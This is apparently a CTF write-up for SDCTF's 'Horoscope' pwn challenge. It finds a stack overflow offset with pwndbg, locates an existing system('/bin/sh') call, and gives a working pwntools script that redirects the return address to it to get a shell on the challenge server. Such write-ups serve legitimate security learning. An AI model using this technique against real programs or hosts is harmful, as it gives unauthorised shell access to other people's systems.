# Horoscope

## Challenge

This program will predict your future!

Connect ```nc horoscope.sdc.tf 1337```

[binary](horoscope)

By green beans

## Solution

The binary suffers from a buffer overflow

```
please put in your birthday and time in the format (month/day/year/time) and we will have your very own horoscope
6/1/22aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab
wow, you were born in the month of June. I think that means you will have a great week! :)
Program received signal SIGSEGV, Segmentation fault.

pwndbg> x/s $rsp
0x7fffffffe388: "aanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab\n"
pwndbg> cyclic -l aana
50
```
The binary contains a call to ```system('/bin/sh')``` at ```0x40095f``` 

```
pwndbg> disassemble test
Dump of assembler code for function test:
   0x0000000000400950 <+0>:     push   rbp
   0x0000000000400951 <+1>:     mov    rbp,rsp
   0x0000000000400954 <+4>:     mov    eax,DWORD PTR [rip+0x200732]        # 0x60108c <temp>
   0x000000000040095a <+10>:    cmp    eax,0x1
   0x000000000040095d <+13>:    jne    0x40096b <test+27>
   0x000000000040095f <+15>:    lea    rdi,[rip+0x252]        # 0x400bb8
   0x0000000000400966 <+22>:    call   0x400600 <system@plt>
   0x000000000040096b <+27>:    nop
   0x000000000040096c <+28>:    pop    rbp
   0x000000000040096d <+29>:    ret    
End of assembler dump.
pwndbg> x/s 0x400bb8
0x400bb8:       "/bin/sh"
```

Since the binary does not have PIE or Stack Canaries enabled, the solution is fairly straightforward.

```
└─# pwn checksec ./horoscope 
[*] '/root/workspace/ctfs/sdctf/horoscope/horoscope'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

Our final script:

```python
from pwn import *

binary = args.BIN

context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary)
r = ROP(e)

gs = '''
continue
'''

def start():
    if args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    elif args.REMOTE:
        return remote('horoscope.sdc.tf', 1337)
    else:
        return process(e.path)

p = start()

pad =b'6/1/22'+cyclic(50)
chain = p64(0x40095f)
p.sendline(pad+chain)
p.interactive()
```


